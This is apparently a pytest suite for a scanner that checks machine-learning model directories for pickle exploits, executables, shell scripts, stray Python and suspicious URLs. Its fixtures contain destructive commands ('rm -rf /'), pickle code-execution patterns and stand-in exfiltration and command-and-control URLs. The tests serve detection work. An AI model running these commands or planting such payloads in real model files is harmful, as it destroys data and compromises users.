"""Unit tests for model_provenance.scanner module.

Covers suspicious file pattern detection including pickle exploits, ELF/PE
executables, shell scripts, Python scripts, suspicious URLs, shared libraries,
archive bombs, and the full directory/file-list scanner.
"""

from __future__ import annotations

import struct
from pathlib import Path

import pytest

from model_provenance.scanner import (
    FindingCategory,
    FindingSeverity,
    ModelScanner,
    ScanFinding,
    ScanReport,
    _iter_files,
    scan_directory,
    scan_file_bytes,
    scan_file_content,
    scan_for_archive_bombs,
    scan_for_executable_magic,
    scan_for_pickle_exploits,
    scan_for_shared_libraries,
    scan_for_shell_scripts,
    scan_for_suspicious_urls,
    scan_for_unexpected_python,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_finding(
    path: str = "model.bin",
    category: FindingCategory = FindingCategory.PICKLE_EXPLOIT,
    severity: FindingSeverity = FindingSeverity.HIGH,
    title: str = "Test finding",
    description: str = "Test description",
    remediation: str = "Test remediation",
    offset: int | None = None,
) -> ScanFinding:
    return ScanFinding(
        path=path,
        category=category,
        severity=severity,
        title=title,
        description=description,
        remediation=remediation,
        offset=offset,
    )


def _make_elf_header() -> bytes:
    """Produce a minimal ELF magic header."""
    return b"\x7fELF" + b"\x00" * 60


def _make_pe_header() -> bytes:
    """Produce a minimal PE (MZ) header with a valid PE signature offset."""
    header = bytearray(b"MZ" + b"\x00" * 58)
    pe_offset = 64
    # Write PE offset at bytes 60-63 (little-endian).
    struct.pack_into("<I", header, 60, pe_offset)
    # Extend to accommodate the PE signature.
    header.extend(b"\x00" * (pe_offset + 4 - len(header)))
    # Write PE signature at the offset.
    struct.pack_into("4s", header, pe_offset, b"PE\x00\x00")
    return bytes(header)


# ---------------------------------------------------------------------------
# ScanFinding
# ---------------------------------------------------------------------------


class TestScanFinding:
    def test_to_dict_keys(self) -> None:
        finding = _make_finding()
        d = finding.to_dict()
        expected_keys = {
            "path",
            "category",
            "severity",
            "title",
            "description",
            "offset",
            "remediation",
        }
        assert set(d.keys()) == expected_keys

    def test_to_dict_category_is_string(self) -> None:
        finding = _make_finding(category=FindingCategory.PICKLE_EXPLOIT)
        assert finding.to_dict()["category"] == "pickle_exploit"

    def test_to_dict_severity_is_string(self) -> None:
        finding = _make_finding(severity=FindingSeverity.CRITICAL)
        assert finding.to_dict()["severity"] == "critical"

    def test_to_dict_offset_none_when_not_set(self) -> None:
        finding = _make_finding(offset=None)
        assert finding.to_dict()["offset"] is None

    def test_to_dict_offset_set(self) -> None:
        finding = _make_finding(offset=42)
        assert finding.to_dict()["offset"] == 42

    def test_to_dict_path_preserved(self) -> None:
        finding = _make_finding(path="sub/model.bin")
        assert finding.to_dict()["path"] == "sub/model.bin"

    def test_all_categories_have_string_values(self) -> None:
        for cat in FindingCategory:
            assert isinstance(cat.value, str)

    def test_all_severities_have_string_values(self) -> None:
        for sev in FindingSeverity:
            assert isinstance(sev.value, str)


# ---------------------------------------------------------------------------
# ScanReport
# ---------------------------------------------------------------------------


class TestScanReport:
    def _make_report_with_findings(
        self,
        n_critical: int = 0,
        n_high: int = 0,
        n_medium: int = 0,
        n_low: int = 0,
    ) -> ScanReport:
        report = ScanReport(model_id="test/model")
        for i in range(n_critical):
            report.findings.append(
                _make_finding(
                    path=f"critical_{i}.bin",
                    severity=FindingSeverity.CRITICAL,
                )
            )
        for i in range(n_high):
            report.findings.append(
                _make_finding(
                    path=f"high_{i}.sh",
                    severity=FindingSeverity.HIGH,
                )
            )
        for i in range(n_medium):
            report.findings.append(
                _make_finding(
                    path=f"medium_{i}.json",
                    severity=FindingSeverity.MEDIUM,
                )
            )
        for i in range(n_low):
            report.findings.append(
                _make_finding(
                    path=f"low_{i}.txt",
                    severity=FindingSeverity.LOW,
                )
            )
        report.scanned_files = [f"file_{i}.bin" for i in range(5)]
        return report

    def test_is_clean_when_no_findings(self) -> None:
        report = ScanReport(model_id="test/model")
        assert report.is_clean

    def test_is_clean_false_when_findings(self) -> None:
        report = self._make_report_with_findings(n_high=1)
        assert not report.is_clean

    def test_critical_findings_filtered(self) -> None:
        report = self._make_report_with_findings(n_critical=2, n_high=1)
        assert len(report.critical_findings) == 2

    def test_high_findings_filtered(self) -> None:
        report = self._make_report_with_findings(n_critical=1, n_high=3)
        assert len(report.high_findings) == 3

    def test_medium_findings_filtered(self) -> None:
        report = self._make_report_with_findings(n_medium=2)
        assert len(report.medium_findings) == 2

    def test_low_findings_filtered(self) -> None:
        report = self._make_report_with_findings(n_low=4)
        assert len(report.low_findings) == 4

    def test_has_critical_or_high_true_for_critical(self) -> None:
        report = self._make_report_with_findings(n_critical=1)
        assert report.has_critical_or_high

    def test_has_critical_or_high_true_for_high(self) -> None:
        report = self._make_report_with_findings(n_high=1)
        assert report.has_critical_or_high

    def test_has_critical_or_high_false_for_medium_only(self) -> None:
        report = self._make_report_with_findings(n_medium=1)
        assert not report.has_critical_or_high

    def test_has_critical_or_high_false_when_clean(self) -> None:
        report = ScanReport(model_id="test/model")
        assert not report.has_critical_or_high

    def test_finding_count(self) -> None:
        report = self._make_report_with_findings(n_critical=1, n_high=2, n_medium=3)
        assert report.finding_count == 6

    def test_scanned_count(self) -> None:
        report = self._make_report_with_findings()
        assert report.scanned_count == 5

    def test_findings_for_file(self) -> None:
        report = self._make_report_with_findings(n_high=1)
        # The first high finding is at path "high_0.sh"
        findings = report.findings_for_file("high_0.sh")
        assert len(findings) == 1

    def test_findings_for_file_empty_when_not_found(self) -> None:
        report = self._make_report_with_findings(n_high=1)
        assert report.findings_for_file("nonexistent.bin") == []

    def test_findings_for_file_normalises_path(self) -> None:
        report = ScanReport(model_id="test/model")
        report.findings.append(
            _make_finding(path="sub/model.bin", severity=FindingSeverity.HIGH)
        )
        # Should still be found with the normalised path.
        findings = report.findings_for_file("sub/model.bin")
        assert len(findings) == 1

    def test_to_dict_keys(self) -> None:
        report = self._make_report_with_findings(n_high=1)
        d = report.to_dict()
        expected_keys = {
            "model_id",
            "is_clean",
            "finding_count",
            "scanned_count",
            "skipped_count",
            "critical_count",
            "high_count",
            "medium_count",
            "low_count",
            "findings",
            "scanned_files",
            "skipped_files",
            "scan_error",
        }
        assert set(d.keys()) == expected_keys

    def test_to_dict_findings_is_list(self) -> None:
        report = self._make_report_with_findings(n_high=2)
        d = report.to_dict()
        assert isinstance(d["findings"], list)
        assert len(d["findings"]) == 2

    def test_to_dict_counts(self) -> None:
        report = self._make_report_with_findings(n_critical=1, n_high=2, n_medium=3, n_low=1)
        d = report.to_dict()
        assert d["critical_count"] == 1
        assert d["high_count"] == 2
        assert d["medium_count"] == 3
        assert d["low_count"] == 1
        assert d["finding_count"] == 7

    def test_to_dict_is_clean_true_when_no_findings(self) -> None:
        report = ScanReport(model_id="test/model")
        report.scanned_files = ["config.json"]
        d = report.to_dict()
        assert d["is_clean"] is True

    def test_to_dict_scan_error_none_by_default(self) -> None:
        report = ScanReport(model_id="test/model")
        assert report.to_dict()["scan_error"] is None

    def test_to_dict_scan_error_populated(self) -> None:
        report = ScanReport(model_id="test/model", scan_error="something failed")
        assert report.to_dict()["scan_error"] == "something failed"


# ---------------------------------------------------------------------------
# scan_for_pickle_exploits
# ---------------------------------------------------------------------------


class TestScanForPickleExploits:
    def test_no_findings_for_clean_data(self) -> None:
        data = b"\x80\x04\x95\x0f\x00\x00\x00\x00\x00\x00\x00\x8c\x05hello\x94."
        findings = scan_for_pickle_exploits("model.bin", data)
        # Clean tensor data — may or may not trigger opcode findings but
        # should not produce pattern-based CRITICAL findings.
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) == 0

    def test_detects_os_system_pattern(self) -> None:
        # Embed the dangerous pattern in the data.
        data = b"some prefix " + b"os\nsystem" + b" some suffix"
        findings = scan_for_pickle_exploits("model.bin", data)
        assert len(findings) >= 1
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_detects_subprocess_popen(self) -> None:
        data = b"\x80\x04" + b"subprocess\nPopen" + b"\x94."
        findings = scan_for_pickle_exploits("model.pkl", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_detects_builtins_exec(self) -> None:
        data = b"builtins\nexec" + b"\x00" * 10
        findings = scan_for_pickle_exploits("model.bin", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_detects_builtins_eval(self) -> None:
        data = b"builtins\neval" + b"\x00" * 10
        findings = scan_for_pickle_exploits("checkpoint.ckpt", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_finding_category_is_pickle_exploit(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        findings = scan_for_pickle_exploits("model.bin", data)
        assert all(f.category == FindingCategory.PICKLE_EXPLOIT for f in findings)

    def test_finding_has_remediation(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        findings = scan_for_pickle_exploits("model.bin", data)
        for f in findings:
            assert len(f.remediation) > 0

    def test_finding_offset_set_for_pattern_match(self) -> None:
        data = b"prefix " + b"os\nsystem" + b" suffix"
        findings = scan_for_pickle_exploits("model.bin", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1
        assert critical[0].offset is not None
        assert critical[0].offset >= 0

    def test_path_preserved_in_finding(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        findings = scan_for_pickle_exploits("sub/model.bin", data)
        for f in findings:
            assert f.path == "sub/model.bin"

    def test_empty_data_no_findings(self) -> None:
        findings = scan_for_pickle_exploits("model.bin", b"")
        assert len(findings) == 0

    def test_multiple_patterns_produce_multiple_findings(self) -> None:
        data = b"os\nsystem" + b"\x00" * 5 + b"builtins\nexec" + b"\x00" * 5
        findings = scan_for_pickle_exploits("model.bin", data)
        assert len(findings) >= 1  # At least one finding

    def test_opcode_only_gives_high_not_critical(self) -> None:
        # Build data with dangerous opcodes but no pattern strings.
        # Use the REDUCE opcode (ord('R') = 82).
        data = bytes([82, 0, 0, 0, 0]) + b"\x00" * 20
        findings = scan_for_pickle_exploits("model.bin", data)
        # May have HIGH finding for opcodes, but no CRITICAL pattern finding.
        high = [f for f in findings if f.severity == FindingSeverity.HIGH]
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        # We expect opcodes to trigger HIGH if no pattern match.
        # (The exact result depends on whether opcode is in REDUCE set)
        assert len(critical) == 0  # No dangerous patterns


# ---------------------------------------------------------------------------
# scan_for_executable_magic
# ---------------------------------------------------------------------------


class TestScanForExecutableMagic:
    def test_detects_elf_magic(self) -> None:
        data = _make_elf_header()
        findings = scan_for_executable_magic("binary", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.EXECUTABLE for f in findings)

    def test_elf_finding_is_critical(self) -> None:
        data = _make_elf_header()
        findings = scan_for_executable_magic("binary", data)
        elf_findings = [f for f in findings if f.category == FindingCategory.EXECUTABLE]
        assert all(f.severity == FindingSeverity.CRITICAL for f in elf_findings)

    def test_detects_pe_magic_with_valid_header(self) -> None:
        data = _make_pe_header()
        findings = scan_for_executable_magic("malware.exe", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.EXECUTABLE for f in findings)

    def test_pe_finding_is_critical(self) -> None:
        data = _make_pe_header()
        findings = scan_for_executable_magic("malware.exe", data)
        pe_findings = [f for f in findings if f.category == FindingCategory.EXECUTABLE]
        assert all(f.severity == FindingSeverity.CRITICAL for f in pe_findings)

    def test_clean_binary_no_findings(self) -> None:
        data = b"\x00" * 64  # Not ELF or PE
        findings = scan_for_executable_magic("model.safetensors", data)
        assert len(findings) == 0

    def test_normal_binary_data_no_elf_flag(self) -> None:
        data = b"\xff\xfe" + b"\x00" * 62  # UTF-16 BOM, not ELF
        findings = scan_for_executable_magic("model.bin", data)
        elf_findings = [f for f in findings if "ELF" in f.title]
        assert len(elf_findings) == 0

    def test_path_preserved(self) -> None:
        data = _make_elf_header()
        findings = scan_for_executable_magic("sub/malware", data)
        for f in findings:
            assert f.path == "sub/malware"

    def test_exe_extension_triggers_pe_check(self) -> None:
        # MZ header without valid PE structure but .exe extension.
        data = b"MZ" + b"\x00" * 60
        findings = scan_for_executable_magic("payload.exe", data)
        # Should flag due to .exe extension match.
        assert len(findings) >= 1

    def test_dll_extension_triggers_pe_check(self) -> None:
        data = b"MZ" + b"\x00" * 60
        findings = scan_for_executable_magic("hook.dll", data)
        assert len(findings) >= 1

    def test_finding_has_remediation(self) -> None:
        data = _make_elf_header()
        findings = scan_for_executable_magic("binary", data)
        for f in findings:
            assert len(f.remediation) > 0

    def test_empty_data_no_findings(self) -> None:
        findings = scan_for_executable_magic("model.bin", b"")
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# scan_for_shell_scripts
# ---------------------------------------------------------------------------


class TestScanForShellScripts:
    def test_detects_sh_extension(self) -> None:
        data = b"#!/bin/sh\necho hello\n"
        findings = scan_for_shell_scripts("run.sh", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.SHELL_SCRIPT for f in findings)

    def test_detects_bash_extension(self) -> None:
        data = b"#!/bin/bash\necho test\n"
        findings = scan_for_shell_scripts("setup.bash", data)
        assert len(findings) >= 1

    def test_detects_ps1_extension(self) -> None:
        data = b"Write-Host 'Hello'\n"
        findings = scan_for_shell_scripts("deploy.ps1", data)
        assert len(findings) >= 1

    def test_detects_batch_file(self) -> None:
        data = b"@echo off\necho test\n"
        findings = scan_for_shell_scripts("run.bat", data)
        assert len(findings) >= 1

    def test_detects_shebang_line(self) -> None:
        data = b"#!/usr/bin/env bash\necho shebang\n"
        # Even without a .sh extension, shebang should be detected.
        findings = scan_for_shell_scripts("hidden_script", data)
        assert len(findings) >= 1

    def test_detects_python_shebang(self) -> None:
        data = b"#!/usr/bin/env python\nprint('hello')\n"
        findings = scan_for_shell_scripts("script", data)
        assert len(findings) >= 1

    def test_sh_finding_is_high_severity(self) -> None:
        data = b"#!/bin/sh\nrm -rf /\n"
        findings = scan_for_shell_scripts("evil.sh", data)
        shell_findings = [f for f in findings if f.category == FindingCategory.SHELL_SCRIPT]
        assert all(f.severity == FindingSeverity.HIGH for f in shell_findings)

    def test_no_findings_for_json_file(self) -> None:
        data = b'{"key": "value"}'
        findings = scan_for_shell_scripts("config.json", data)
        assert len(findings) == 0

    def test_no_findings_for_binary_weight(self) -> None:
        data = b"\x00\x01\x02\x03" * 100
        findings = scan_for_shell_scripts("model.safetensors", data)
        assert len(findings) == 0

    def test_path_preserved(self) -> None:
        data = b"#!/bin/bash\n"
        findings = scan_for_shell_scripts("sub/deploy.sh", data)
        for f in findings:
            assert f.path == "sub/deploy.sh"

    def test_finding_has_remediation(self) -> None:
        data = b"#!/bin/sh\necho test"
        findings = scan_for_shell_scripts("run.sh", data)
        for f in findings:
            assert len(f.remediation) > 0

    def test_empty_data_with_sh_extension(self) -> None:
        findings = scan_for_shell_scripts("empty.sh", b"")
        # Extension alone should still flag.
        assert len(findings) >= 1

    def test_cmd_extension_detected(self) -> None:
        data = b"@echo off\ndir\n"
        findings = scan_for_shell_scripts("run.cmd", data)
        assert len(findings) >= 1


# ---------------------------------------------------------------------------
# scan_for_unexpected_python
# ---------------------------------------------------------------------------


class TestScanForUnexpectedPython:
    def test_detects_unexpected_py_file(self) -> None:
        data = b"print('hello world')\n"
        findings = scan_for_unexpected_python("exploit.py", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.EMBEDDED_SCRIPT for f in findings)

    def test_benign_init_py_not_flagged(self) -> None:
        data = b"# package init\n"
        findings = scan_for_unexpected_python("__init__.py", data)
        assert len(findings) == 0

    def test_benign_setup_py_not_flagged(self) -> None:
        data = b"from setuptools import setup\nsetup(name='x')\n"
        findings = scan_for_unexpected_python("setup.py", data)
        assert len(findings) == 0

    def test_benign_tokenization_not_flagged(self) -> None:
        data = b"class Tokenizer:\n    pass\n"
        findings = scan_for_unexpected_python("tokenization.py", data)
        assert len(findings) == 0

    def test_critical_for_os_system_call(self) -> None:
        data = b"import os\nos.system('rm -rf /')\n"
        findings = scan_for_unexpected_python("evil.py", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_critical_for_exec_call(self) -> None:
        data = b"exec(open('payload.py').read())\n"
        findings = scan_for_unexpected_python("loader.py", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_critical_for_eval_call(self) -> None:
        data = b"result = eval(user_input)\n"
        findings = scan_for_unexpected_python("unsafe.py", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_critical_for_subprocess(self) -> None:
        data = b"import subprocess\nsubprocess.call(['ls'])\n"
        findings = scan_for_unexpected_python("runner.py", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1

    def test_medium_for_benign_looking_script(self) -> None:
        data = b"# Just some helper code\ndef helper():\n    return 42\n"
        findings = scan_for_unexpected_python("helper.py", data)
        assert len(findings) >= 1
        medium = [f for f in findings if f.severity == FindingSeverity.MEDIUM]
        assert len(medium) >= 1

    def test_non_py_extension_not_flagged(self) -> None:
        data = b"print('hello')\n"
        findings = scan_for_unexpected_python("model.bin", data)
        assert len(findings) == 0

    def test_json_not_flagged(self) -> None:
        data = b'{"key": "value"}'
        findings = scan_for_unexpected_python("config.json", data)
        assert len(findings) == 0

    def test_path_preserved(self) -> None:
        data = b"print('hello')\n"
        findings = scan_for_unexpected_python("sub/exploit.py", data)
        for f in findings:
            assert f.path == "sub/exploit.py"

    def test_finding_has_remediation(self) -> None:
        data = b"print('hello')\n"
        findings = scan_for_unexpected_python("script.py", data)
        for f in findings:
            assert len(f.remediation) > 0

    def test_critical_for_urlopen(self) -> None:
        data = b"import urllib.request\nurllib.request.urlopen('http://evil.com')\n"
        findings = scan_for_unexpected_python("fetch.py", data)
        critical = [f for f in findings if f.severity == FindingSeverity.CRITICAL]
        assert len(critical) >= 1


# ---------------------------------------------------------------------------
# scan_for_suspicious_urls
# ---------------------------------------------------------------------------


class TestScanForSuspiciousUrls:
    def test_no_findings_for_clean_config(self) -> None:
        data = b'{"model_type": "bert", "version": "1.0"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) == 0

    def test_no_findings_for_huggingface_url(self) -> None:
        data = b'{"source": "https://huggingface.co/bert-base-uncased"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) == 0

    def test_no_findings_for_github_url(self) -> None:
        data = b'{"repo": "https://github.com/example/repo"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) == 0

    def test_no_findings_for_pytorch_url(self) -> None:
        data = b'{"download": "https://pytorch.org/models/resnet.pth"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) == 0

    def test_detects_suspicious_url(self) -> None:
        data = b'{"callback": "https://evil-domain-xyz.com/exfil?data=secret"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.SUSPICIOUS_URL for f in findings)

    def test_suspicious_url_severity_is_medium(self) -> None:
        data = b'{"url": "https://suspicious-site.net/payload"}'
        findings = scan_for_suspicious_urls("config.json", data)
        url_findings = [f for f in findings if f.category == FindingCategory.SUSPICIOUS_URL]
        assert all(f.severity == FindingSeverity.MEDIUM for f in url_findings)

    def test_only_scans_text_extensions(self) -> None:
        # Binary files should not be scanned for URLs.
        data = b'https://evil.com/payload'
        findings = scan_for_suspicious_urls("model.bin", data)
        assert len(findings) == 0  # .bin is not in text scan extensions

    def test_scans_yaml_files(self) -> None:
        data = b'callback: "https://attacker.example-evil-site.com/steal"'
        findings = scan_for_suspicious_urls("config.yaml", data)
        assert len(findings) >= 1

    def test_scans_txt_files(self) -> None:
        data = b'See also: https://malicious-download.io/payload.bin'
        findings = scan_for_suspicious_urls("notes.txt", data)
        assert len(findings) >= 1

    def test_scans_py_files(self) -> None:
        data = b'url = "https://command-control.xyz/cmd"\n'
        findings = scan_for_suspicious_urls("script.py", data)
        assert len(findings) >= 1

    def test_no_urls_no_findings(self) -> None:
        data = b"plain text without any urls here"
        findings = scan_for_suspicious_urls("notes.txt", data)
        assert len(findings) == 0

    def test_multiple_suspicious_urls_single_finding(self) -> None:
        data = (
            b'url1="https://attacker1.xyz/a" '
            b'url2="https://attacker2.abc/b" '
            b'url3="https://c2server.io/c"'
        )
        findings = scan_for_suspicious_urls("config.json", data)
        # Should produce exactly one finding grouping all suspicious URLs.
        url_findings = [f for f in findings if f.category == FindingCategory.SUSPICIOUS_URL]
        assert len(url_findings) == 1

    def test_path_preserved(self) -> None:
        data = b'{"url": "https://evil-target.net/steal"}'
        findings = scan_for_suspicious_urls("sub/config.json", data)
        for f in findings:
            assert f.path == "sub/config.json"

    def test_amazonaws_trusted(self) -> None:
        data = b'{"model": "https://mybucket.s3.amazonaws.com/model.bin"}'
        findings = scan_for_suspicious_urls("config.json", data)
        assert len(findings) == 0

    def test_no_findings_for_safetensors(self) -> None:
        data = b'https://evil.com/steal'
        findings = scan_for_suspicious_urls("model.safetensors", data)
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# scan_for_shared_libraries
# ---------------------------------------------------------------------------


class TestScanForSharedLibraries:
    def test_detects_so_with_elf_magic(self) -> None:
        data = _make_elf_header()
        findings = scan_for_shared_libraries("libevil.so", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.SHARED_LIBRARY for f in findings)

    def test_detects_dll_by_extension(self) -> None:
        data = b"MZ" + b"\x00" * 60
        findings = scan_for_shared_libraries("hook.dll", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.SHARED_LIBRARY for f in findings)

    def test_detects_dylib_by_extension(self) -> None:
        data = _make_elf_header()
        findings = scan_for_shared_libraries("lib.dylib", data)
        assert len(findings) >= 1

    def test_shared_library_severity_is_high(self) -> None:
        data = _make_elf_header()
        findings = scan_for_shared_libraries("libevil.so", data)
        so_findings = [f for f in findings if f.category == FindingCategory.SHARED_LIBRARY]
        assert all(f.severity == FindingSeverity.HIGH for f in so_findings)

    def test_no_findings_for_safetensors(self) -> None:
        data = b"\x00" * 64
        findings = scan_for_shared_libraries("model.safetensors", data)
        assert len(findings) == 0

    def test_no_findings_for_json(self) -> None:
        data = b'{"key": "value"}'
        findings = scan_for_shared_libraries("config.json", data)
        assert len(findings) == 0

    def test_path_preserved(self) -> None:
        data = _make_elf_header()
        findings = scan_for_shared_libraries("sub/libevil.so", data)
        for f in findings:
            assert f.path == "sub/libevil.so"

    def test_finding_has_remediation(self) -> None:
        data = _make_elf_header()
        findings = scan_for_shared_libraries("libevil.so", data)
        for f in findings:
            assert len(f.remediation) > 0

    def test_so_extension_without_elf_still_flagged(self) -> None:
        # Extension alone should be sufficient to flag.
        data = b"\x00" * 64
        findings = scan_for_shared_libraries("hidden.so", data)
        assert len(findings) >= 1


# ---------------------------------------------------------------------------
# scan_for_archive_bombs
# ---------------------------------------------------------------------------


class TestScanForArchiveBombs:
    def test_detects_zip_magic(self) -> None:
        data = b"PK\x03\x04" + b"\x00" * 60
        findings = scan_for_archive_bombs("archive.zip", data)
        assert len(findings) >= 1
        assert any(f.category == FindingCategory.ARCHIVE_BOMB for f in findings)

    def test_detects_gzip_magic(self) -> None:
        data = b"\x1f\x8b" + b"\x00" * 60
        findings = scan_for_archive_bombs("data.tar.gz", data)
        assert len(findings) >= 1

    def test_detects_bzip2_magic(self) -> None:
        data = b"BZh" + b"\x00" * 60
        findings = scan_for_archive_bombs("data.bz2", data)
        assert len(findings) >= 1

    def test_detects_xz_magic(self) -> None:
        data = b"\xfd7zXZ\x00" + b"\x00" * 60
        findings = scan_for_archive_bombs("data.xz", data)
        assert len(findings) >= 1

    def test_archive_severity_is_medium(self) -> None:
        data = b"PK\x03\x04" + b"\x00" * 60
        findings = scan_for_archive_bombs("nested.zip", data)
        archive_findings = [f for f in findings if f.category == FindingCategory.ARCHIVE_BOMB]
        assert all(f.severity == FindingSeverity.MEDIUM for f in archive_findings)

    def test_no_findings_for_model_weights(self) -> None:
        data = b"\x00\x01\x02\x03" * 100
        findings = scan_for_archive_bombs("model.safetensors", data)
        assert len(findings) == 0

    def test_no_findings_for_config_json(self) -> None:
        data = b'{"model_type": "bert"}'
        findings = scan_for_archive_bombs("config.json", data)
        assert len(findings) == 0

    def test_zip_extension_alone_flags(self) -> None:
        # Even without magic bytes, .zip extension should be flagged.
        data = b"\x00" * 60
        findings = scan_for_archive_bombs("backup.zip", data)
        assert len(findings) >= 1

    def test_tar_extension_alone_flags(self) -> None:
        data = b"\x00" * 60
        findings = scan_for_archive_bombs("model_backup.tar", data)
        assert len(findings) >= 1

    def test_path_preserved(self) -> None:
        data = b"PK\x03\x04" + b"\x00" * 60
        findings = scan_for_archive_bombs("sub/nested.zip", data)
        for f in findings:
            assert f.path == "sub/nested.zip"

    def test_finding_has_remediation(self) -> None:
        data = b"PK\x03\x04" + b"\x00" * 60
        findings = scan_for_archive_bombs("archive.zip", data)
        for f in findings:
            assert len(f.remediation) > 0


# ---------------------------------------------------------------------------
# scan_file_content (combined scanner)
# ---------------------------------------------------------------------------


class TestScanFileContent:
    def test_clean_file_no_findings(self) -> None:
        data = b'{"model_type": "bert", "hidden_size": 768}'
        findings = scan_file_content("config.json", data)
        # Trusted URLs and no suspicious patterns.
        assert isinstance(findings, list)

    def test_elf_triggers_executable_finding(self) -> None:
        data = _make_elf_header()
        findings = scan_file_content("binary", data)
        categories = {f.category for f in findings}
        assert FindingCategory.EXECUTABLE in categories

    def test_shell_script_triggers_finding(self) -> None:
        data = b"#!/bin/bash\nrm -rf /\n"
        findings = scan_file_content("deploy.sh", data)
        categories = {f.category for f in findings}
        assert FindingCategory.SHELL_SCRIPT in categories

    def test_pickle_exploit_triggers_finding(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        findings = scan_file_content("model.bin", data)
        categories = {f.category for f in findings}
        assert FindingCategory.PICKLE_EXPLOIT in categories

    def test_check_pickle_disabled(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        findings = scan_file_content("model.bin", data, check_pickle=False)
        pickle_findings = [f for f in findings if f.category == FindingCategory.PICKLE_EXPLOIT]
        assert len(pickle_findings) == 0

    def test_check_executables_disabled(self) -> None:
        data = _make_elf_header()
        findings = scan_file_content("binary", data, check_executables=False)
        exe_findings = [f for f in findings if f.category == FindingCategory.EXECUTABLE]
        assert len(exe_findings) == 0

    def test_check_scripts_disabled(self) -> None:
        data = b"#!/bin/bash\nrm -rf /\n"
        findings = scan_file_content("deploy.sh", data, check_scripts=False)
        script_findings = [f for f in findings if f.category == FindingCategory.SHELL_SCRIPT]
        assert len(script_findings) == 0

    def test_check_urls_disabled(self) -> None:
        data = b'{"url": "https://evil.xyz/steal"}'
        findings = scan_file_content("config.json", data, check_urls=False)
        url_findings = [f for f in findings if f.category == FindingCategory.SUSPICIOUS_URL]
        assert len(url_findings) == 0

    def test_check_shared_libs_disabled(self) -> None:
        data = _make_elf_header()
        findings = scan_file_content("libevil.so", data, check_shared_libs=False)
        lib_findings = [f for f in findings if f.category == FindingCategory.SHARED_LIBRARY]
        assert len(lib_findings) == 0

    def test_check_archives_disabled(self) -> None:
        data = b"PK\x03\x04" + b"\x00" * 60
        findings = scan_file_content("archive.zip", data, check_archives=False)
        archive_findings = [f for f in findings if f.category == FindingCategory.ARCHIVE_BOMB]
        assert len(archive_findings) == 0

    def test_returns_list(self) -> None:
        data = b"clean data"
        result = scan_file_content("file.txt", data)
        assert isinstance(result, list)

    def test_all_checks_disabled_no_findings(self) -> None:
        data = b"os\nsystem" + _make_elf_header() + b"#!/bin/sh"
        findings = scan_file_content(
            "evil_file.sh",
            data,
            check_pickle=False,
            check_executables=False,
            check_scripts=False,
            check_urls=False,
            check_shared_libs=False,
            check_archives=False,
        )
        assert len(findings) == 0

    def test_python_script_triggers_embedded_script(self) -> None:
        data = b"import os\nos.system('ls')\n"
        findings = scan_file_content("loader.py", data)
        categories = {f.category for f in findings}
        assert FindingCategory.EMBEDDED_SCRIPT in categories


# ---------------------------------------------------------------------------
# ModelScanner — directory scanning
# ---------------------------------------------------------------------------


class TestModelScannerDirectory:
    def _make_clean_model_dir(self, tmp_path: Path) -> Path:
        model_dir = tmp_path / "clean_model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b'{"model_type": "bert"}')
        (model_dir / "tokenizer.json").write_bytes(b'{"version": "1.0"}')
        (model_dir / "pytorch_model.bin").write_bytes(b"\x00" * 100)
        return model_dir

    def test_scan_clean_directory_returns_report(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        assert isinstance(report, ScanReport)

    def test_scan_clean_directory_has_scanned_files(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        assert report.scanned_count == 3

    def test_model_id_defaults_to_dir_name(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        assert report.model_id == "clean_model"

    def test_custom_model_id(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir, model_id="my-custom-model")
        assert report.model_id == "my-custom-model"

    def test_detects_shell_script_in_dir(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        (model_dir / "evil.sh").write_bytes(b"#!/bin/sh\nrm -rf /\n")
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        shell_findings = [
